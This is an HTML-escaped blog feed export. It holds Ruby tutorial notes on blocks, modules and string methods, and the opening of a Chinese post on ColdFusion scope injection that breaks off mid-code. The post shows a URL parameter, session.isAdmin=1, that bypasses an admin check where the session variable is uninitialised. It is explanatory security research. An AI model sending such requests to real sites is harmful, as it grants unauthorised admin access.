&lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are in the block&lt;/span&gt;也可以通过参数与屈服声明。下面是一个例子：1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;def test&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; yield &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You are in the method test&quot;&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; yield &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;100&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt;test &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You are in the block #{i}&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;这将产生以下结果：1. &lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are in the block &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;2. &lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are in the method test&lt;/span&gt;3. &lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are in the block &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;100&lt;/span&gt;这里的 yield 语句写到后面跟着参数。甚至可以传递多个参数。在该块中放置在两条垂直线之间的变量（| |）接收的参数。因此，在上面的代码中，yield5语句将试块作为一个参数值5。现在看看下面的语句：1. &lt;span class=&quot;pln&quot;&gt;test &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You are in the block #{i}&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;在这里，在变量i中的值为5。现在遵守以下 puts 语句：1. &lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You are in the block #{i}&quot;&lt;/span&gt;puts 语句的输出是：1. &lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are in the block &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;如果想超过一个参数，然后yield语句就变成了：&nbsp;1. &lt;span class=&quot;pln&quot;&gt;yield a&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; b&lt;/span&gt;那么块是：1. &lt;span class=&quot;pln&quot;&gt;test &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; b&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; statement&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;这些参数将用逗号隔开。块和方法:我们已经看到了如何将一个块和方法关联。通常调用块从块具有相同名称的方法，通过使用yield语句。因此，编写：1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;def test&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp; yield&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Hello world&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;这个例子是最简单的方式来实现一个块。调用块 test 使用yield语句。但是，如果最后一个参数的方法前面加上＆，那么可以通过一个块这种方法，此块将被分配到最后一个参数。&amp;#42和＆在参数列表中＆还在后面。1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;def test&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&amp;amp;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; block&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;call&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;test &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Hello World!&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;7. &lt;span class=&quot;typ&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; will produce following result&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;9. &lt;span class=&quot;typ&quot;&gt;Hello&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;World&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!&lt;/span&gt; 10.模块 &lt;span class=&quot;pln&quot;&gt;module &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Identifier&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; statement1&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; statement2&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;...........&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;例子：考虑以下模块写在support.rb文件。 &lt;span class=&quot;pln&quot;&gt;module &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; FIRST_DAY &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Sunday&quot;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; def &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;weeks_in_month&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You have four weeks in a month&quot;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; end&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; def &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;weeks_in_year&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You have 52 weeks in a year&quot;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; end&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;现在，可以在如下一类包括这个模块： &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;require &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;support&quot;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Decade&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;include &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; no_of_yrs&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; def no_of_months&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;FIRST_DAY&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; number&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;#42&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts number&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; end&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;d1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Decade&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;FIRST_DAY&lt;/span&gt; &lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;weeks_in_month&lt;/span&gt; &lt;span class=&quot;typ&quot;&gt;Week&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;weeks_in_year&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;d1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;no_of_months&lt;/span&gt; 11.字符字符转义；表达式替换： &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; y&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; z &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;72&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;The value of x is #{ x }.&quot;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;The sum of x and y is #{ x + y }.&quot;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;The average was #{ (x + y + z)/3 }.&quot;&lt;/span&gt;这将产生以下结果： &lt;span class=&quot;typ&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; value of x is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;12.&lt;/span&gt; &lt;span class=&quot;typ&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; sum of x and y is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;48.&lt;/span&gt; &lt;span class=&quot;typ&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; average was &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;40.&lt;/span&gt;特殊字符：一般分隔的字符串，可以创建字符串匹配任意分隔符，比如，虽然包含在一对，如：., !, (, {, &lt;, 等，前面加上一个百分号(%). Q, q 和 x，有特殊的含义一般可以分隔的字符串。 &lt;span class=&quot;pun&quot;&gt;%{&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Ruby&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is fun&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.}&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; equivalent to &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Ruby is fun.&quot;&lt;/span&gt; &lt;span class=&quot;pun&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;Q&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Ruby&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is fun&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; equivalent to &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot; Ruby is fun. &quot;&lt;/span&gt; &lt;span class=&quot;pun&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Ruby&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is fun&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; equivalent to a single&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;quoted string&lt;/span&gt; &lt;span class=&quot;pun&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; equivalent to back tick command output &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;ls&lt;/span&gt;字符解压：试试下面的例子来解压缩各种数据。&nbsp; &lt;span class=&quot;str&quot;&gt;&quot;abc \0\0abc \0\0&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;A6Z6&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [&quot;abc&quot;, &quot;abc &quot;]&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;&quot;abc \0\0&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;a3a3&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [&quot;abc&quot;, &quot; \000\000&quot;]&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;&quot;abc \0abc \0&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;Z&amp;#42Z&amp;#42&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [&quot;abc &quot;, &quot;abc &quot;]&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;&quot;aa&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;b8B8&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [&quot;10000110&quot;, &quot;01100001&quot;]&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;&quot;aaa&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;h2H2c&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [&quot;16&quot;, &quot;61&quot;, 97]&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;&quot;\xfe\xff\xfe\xff&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;sS&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [-2, 65534]&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;&quot;now=20is&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;M&amp;#42&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [&quot;now is&quot;]&lt;/span&gt; &lt;span class=&quot;str&quot;&gt;&quot;whole&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;xax2aX2aX1aX2a&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [&quot;h&quot;, &quot;e&quot;, &quot;l&quot;, &quot;l&quot;, &quot;o&quot;]&lt;/span&gt;字符内置方法:我们需要有一个String对象实例调用一个String方法。以下的方法来创建String对象的一个实例： &lt;span class=&quot;kwd&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)]&lt;/span&gt;这将返回一个新的字符串对象，其中包含str的一个副本。现在使用str的对象，我们可以任何可用实例方法的。例如： &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;myStr &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;THIS IS TEST&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;foo &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; myStr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;downcase&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;#{foo}&quot;&lt;/span&gt;字符编码：Ruby的默认字符集是ASCII码，字符可能会由单字节表示。如果使用UTF-8或另一种现代的字符集，字符可能会以四个字节表示。可以更改字符集使用$KCODE的在程序的开始行，像这样： &lt;span class=&quot;pln&quot;&gt;$KCODE &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;u&#39;&lt;/span&gt;以下是 $KCODE 可能的值：a[ASCII (same as none). This is the default.]、e[EUC.]、n[None (same as ASCII)]、u[UTF-8] 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CFML中的Scope Injection]]></title>
    <url>%2F2015%2F09%2F01%2Fcfml-e4-b8-ad-e7-9a-84scope-injection%2F</url>
    <content type="text"><![CDATA[0x00 前言 早上按例看mickey牛发的每日新知识，其中有一篇关于CFML中的ScopeInjection，我不知道怎么翻译这个次比较好，是叫“范围注入”还是叫“变量覆盖”？话不多说，在文中我就写“Scope注入”了。 0x01 什么是CFML 1. &lt;span class=&quot;pln&quot;&gt;“CFML的全称是ColdFusion Markup Language，是一种特别适于用来编写互联网应用程序的语言。CFML看上去和传统的编程语言并不太一样，更接近HTML，因此和HTML一样非常的易学易用。CFML可以在ColdFusion应用程序服务器上运行，也可以在其它一些应用程序服务器运行。” ---百度百科&lt;/span&gt; 简而言之，CFML就是一种开发语言，所用于web开发。 0x02 SCOPE注入 假设这是一段权限控制代码，通过session.isAdmin判断用户是不是管理员： &lt;cfifsession.isAdmin&gt; &nbsp;&nbsp;&nbsp; Do something only an admin can do… &lt;/cfif&gt; 如果isAdmin没有被定义在session中，也就是说isAdmin没有被初始化，那么我们像如下来发送一个GET请求会发生什么呢？ /admin/something.cfm?session.isAdmin=1 1. &lt;span class=&quot;pun&quot;&gt;执行流程：&lt;/span&gt;2. &lt;span class=&quot;lit&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;首先检测&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;isAdmin&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;是否被定义在&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;域中&lt;/span&gt;3. &lt;span class=&quot;lit&quot;&gt;2.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;如果没有被定义在&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;中，程序将到别的域中搜索，比如&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;域&lt;/span&gt;4. &lt;span class=&quot;lit&quot;&gt;3.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;如果在&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;域中有&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;isAdmin&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;，并且为&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;true&lt;/span&gt;5. &lt;span class=&quot;lit&quot;&gt;4.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;上面代码的权限控制就被绕过了&lt;/span&gt; 通过上面的描述，有没有感觉有点像php中的register_globals. 0x03 实际测试 测试代码是JosephLamoree写的 https://github.com/ecivis/miniapp 测试环境：windows7+AdobeColdFusion 9（Ps:只找到了这个）&nbsp; 测试代码主要片段： 1. &lt;span class=&quot;tag&quot;&gt;&amp;lt;cfsilent&amp;gt;&lt;/span&gt;2. &lt;span class=&quot;tag&quot;&gt;&amp;lt;cfset&lt;/span&gt;&lt;span 